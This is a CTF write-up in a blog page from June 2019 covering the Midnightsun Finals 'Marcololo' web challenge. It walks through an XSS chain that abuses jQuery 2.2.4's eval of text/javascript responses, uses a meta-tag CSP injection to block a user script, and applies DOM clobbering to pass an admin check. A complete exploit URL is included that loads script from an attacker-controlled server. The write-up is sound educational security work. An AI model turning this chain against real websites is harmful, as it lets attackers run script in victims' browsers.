@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>[CTF Write-up] Midnightsun CTF Finals Marcololo (web. mid)</title>
+  <meta name="description" content="This weekend, Midnightsun CTF Finals took place, a really funny CTF in Stockholm, a lovely place to visit.">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:4000/2019/06/15/midnightsunctf-marcololo/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Hans Topo Blog" href="http://localhost:4000/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="_dreadlocked">
+  <meta name="twitter:title" content="[CTF Write-up] Midnightsun CTF Finals Marcololo (web. mid)">
+  <meta name="twitter:description" content="This weekend, Midnightsun CTF Finals took place, a really funny CTF in Stockholm, a lovely place to visit.">
+  
+    <meta name="twitter:creator" content="_dreadlocked">
+  
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Hans Topo Blog</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+        
+        <a class="page-link" href="https://github.com/yous/whiteglass">GitHub</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">[CTF Write-up] Midnightsun CTF Finals Marcololo (web. mid)</h1>
+    
+    <p class="post-meta"><time datetime="2019-06-15T13:00:00+02:00" itemprop="datePublished">Jun 15, 2019</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/web/">web</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+        <a href="/categories/ctf/">ctf</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/xss/">xss</a>,
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/clobbering/">clobbering</a>
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>This weekend, Midnightsun CTF Finals took place, a really funny CTF in Stockholm, a lovely place to visit.</p>
+
+<p>Marcololo task had the following statement:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>How slow is your metabolism?
+Service: http://marcololo-01.play.midnightsunctf.se:3001
+Author: avlidienbrunn
+</code></pre></div></div>
+
+<p>When accesing the challenge website, the following form was shown:</p>
+
+<p>[image1]</p>
+
+<p>So it seems we need to submit a URL that triggers an alert(1) using XSS to to this form. Also, it indicates us where the actual challenge is, at <code class="highlighter-rouge">http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=marcololo</code></p>
+
+<p>This webpage returned the following HTTP response:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Content-Type: text/html; charset=utf-8
+Content-Length: 390
+ETag: W/"186-zb58dqJWgRpwGL9cKYBdnemMbKQ"
+Date: Sun, 16 Jun 2019 16:16:25 GMT
+Connection: close
+
+
+<span class="nt">&lt;head&gt;</span>
+  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/static/style.css"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:title"</span> <span class="na">content=</span><span class="s">"marcololo"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-2.2.4.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/api/getuser"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+
+<span class="nt">&lt;script&gt;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">){</span>
+  <span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"u are not admin, fak off"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>As you can see, if <code class="highlighter-rouge">user.name == admin</code> condition returns true, then, <code class="highlighter-rouge">$.get(location.hash.slice(1))</code> will be executed. This <code class="highlighter-rouge">user.name</code> object, came from <code class="highlighter-rouge">&lt;script src="/api/getuser"&gt;&lt;/script&gt;</code>, this javascript just returned an object with the following attributes: <code class="highlighter-rouge">user = {"id":"-1", "name": "guest", "type": "guest"}</code>, <code class="highlighter-rouge">location.hash.slice(1)</code> is the first string before “#” element on the URL.</p>
+
+<p>But where’s the XSS here?</p>
+
+<p>Ok, if you see, the <code class="highlighter-rouge">input</code> parameter is being reflected, but unfortunetly, <code class="highlighter-rouge">&lt;,&gt; and /</code> characters are filtered on the response, so simply injecting <code class="highlighter-rouge">"&gt;&lt;script&gt;...&lt;/script&gt;</code> will not work.</p>
+
+<p>There needs to be another path… Did you notice that jQuery version?, 2.2.4 seems a bit old right? Yes, and it has an XSS vulnerability! Bingo!. On jQuery 2.2.4, if a user GET a resource and the Content-Type response header is <code class="highlighter-rouge">text/javascript</code>, jQuery will simply eval the response as javascript, I developed a quick dummy TCP server that always returns:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.0 200 OK
+Content-Type: text/javascript
+Access-Control-Allow-Origin: *
+
+alert(1)
+</code></pre></div></div>
+
+<p>I tested it on Chrome’s console, doing <code class="highlighter-rouge">$.get("http://&lt;my-server-ip&gt;:&lt;my-server-port&gt;")</code>, and it worked!! XSS executed!!</p>
+
+<p>Well, first problem seems to be solved, now we know how to trigger an XSS. But not that fast, now we need to figure out how to bypass that <code class="highlighter-rouge">user.name == admin</code> check.</p>
+
+<p>If you rememeber, we can reflect on the <code class="highlighter-rouge">content=</code> attribute of the <code class="highlighter-rouge">&lt;meta&gt;</code> tag, so: How about injecting other meta attributes? Like, for expample, <code class="highlighter-rouge">http-equiv</code> which will let us to mimic a response header. At first, we think that maybe abusing XSS Auditor on filter mode (the default mode on latest Chrome browser versions) could help us on filtering the  <code class="highlighter-rouge">&lt;script src="/api/getuser"&gt;&lt;/script&gt;</code> so we tried to inject <code class="highlighter-rouge">1" http-equiv="X-XSS-Protection" p="</code>, but it doesn’t work, as the server was already setting an <code class="highlighter-rouge">X-XSS-Protection</code> header, an headers always overwrite <code class="highlighter-rouge">http-quiv</code> meta tag attribute.</p>
+
+<p>Then, I realized that injecting a CSP policy constraining current domain scripts but allowing .jquery.com ones, could prevent <code class="highlighter-rouge">&lt;script src="/api/getuser"&gt;&lt;/script&gt;</code> from loading, but jqeury will be allowed. Also, inline scripts and eval should be allowed, as jQuery bug is triggered beacuse an eval function. Injecting the following CSP header on the meta tag should do the job: <code class="highlighter-rouge">default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com "&lt;my-server-ip&gt;:&lt;my-server-port&gt;" http-equiv="Content-Security-Policy</code>. This worked!! Now Chrome is preventing <code class="highlighter-rouge">&lt;script src="/api/getuser"&gt;&lt;/script&gt;</code>to load, as it comes from <code class="highlighter-rouge">http://marcololo-01.play.midnightsunctf.se:3001</code> and CSP doesn’t allow this URL and also, doesn’t explicity allow <code class="highlighter-rouge">'self'</code>.</p>
+
+<p>But now, <code class="highlighter-rouge">user.name</code> doesn’t exists, as this object is not loaded anymore. This can be workarounded using the old friend, Dom Clobbering. If we also inject <code class="highlighter-rouge">id=name name=admin</code> on the <code class="highlighter-rouge">&lt;meta&gt;</code> tag, javascript will be able to access <code class="highlighter-rouge">user.name</code> attribute, and it will be <code class="highlighter-rouge">admin</code>!!</p>
+
+<p>We tested it and boom! It worked!!!</p>
+
+<p>The final URL (without urlencode for legibility) is:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com &lt;my-server-ip&gt;:&lt;my-server-port&gt;" http-equiv="Content-Security-Policy" id=user name=admin p="#http://&lt;my-server-ip&gt;:&lt;my-server-port&gt;/
+</code></pre></div></div>
+
+<p>When submitting the flag on the initial form, it shows us the flag.</p>
+
+<p>Thanks to <code class="highlighter-rouge">@avlidienbrunn</code> for the challenge and kudos to ID-10-T team for being such a great people.</p>
+
+
+  </div>
+
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy;  - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="http://localhost:4000/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
